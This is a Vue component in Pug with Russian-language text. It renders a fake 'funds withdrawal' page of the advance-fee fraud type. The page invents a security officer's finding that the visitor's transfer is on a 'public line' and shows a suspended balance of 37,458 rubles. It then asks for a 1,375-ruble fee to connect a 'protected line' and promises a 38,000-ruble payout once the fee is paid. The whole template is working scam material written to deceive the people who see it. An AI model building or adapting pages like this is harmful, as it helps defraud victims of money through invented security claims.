<template lang='pug'>
    .step
        .step__top
            .step__top-left.step__top-left_pause
                span.step__top-icon
                    svg(xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" height="140" viewBox="0 0 357 357" xml:space="preserve")
                        path(d="M25.5,357h102V0h-102V357z M229.5,0v357h102V0H229.5z")

            .step__top-right
                .step__top-heading ДАННЫЕ ПЕРЕВОДА ПРОВЕРЕНЫ

                .step__top-desc Оставайтесь на странице во время работы системы

                .step__top-t2 Сотрудник службы безопасности выявил, что ваш перевод проходит по публичной линии связи. Чтобы получить деньги и все ваши дальнейшие переводы проходили безопасно, подключите Защищенную линию связи. Подключение Защищенной линии связи моментальное. Сразу после подключения, вам будет отправлен денежный перевод.

        .step__bot
            .step__bot-header ВЫВОД СРЕДСТВ

            .step__bot-body
                ul.step__bot-balans.list
                    li.step__bot-account
                        span.step__bot-account-bg
                            img(src="~img/images/account-img.svg")

                        span.step__bot-account-title Счет№:

                        span.step__bot-account-value 1773569865 

                    li.step__bot-sum
                        span.step__bot-sum-bg
                            img(src="~img/images/coint-img.svg")

                        span.step__bot-sum-title Баланс счета:

                        span.step__bot-sum-value 37458 руб

                p.step__bot-t1 Статус: <span class="red"> Приостановлен</span>

                p.step__bot-t2 <span class="black">Подключите защищенную линию связи для совершения <br />безопасных денежных переводов. </span>

                p.step__bot-t2 Подключение защищенной линии: <span class="blue bold large">1375 руб</span>

                router-link.step__bot-submit.link(:to="{ name: 'protect' }") ПОДКЛЮЧИТЬ ЗАЩИЩЕННУЮ ЛИНИЮ

                .step__bot-footer Сразу после оплаты комиссии, <br />вам будет отправлен перевод в сумме: 38000 руб.
</template>

<script src='./script.js'></script>

<style lang='scss' src='../firstStep/style.scss'></style>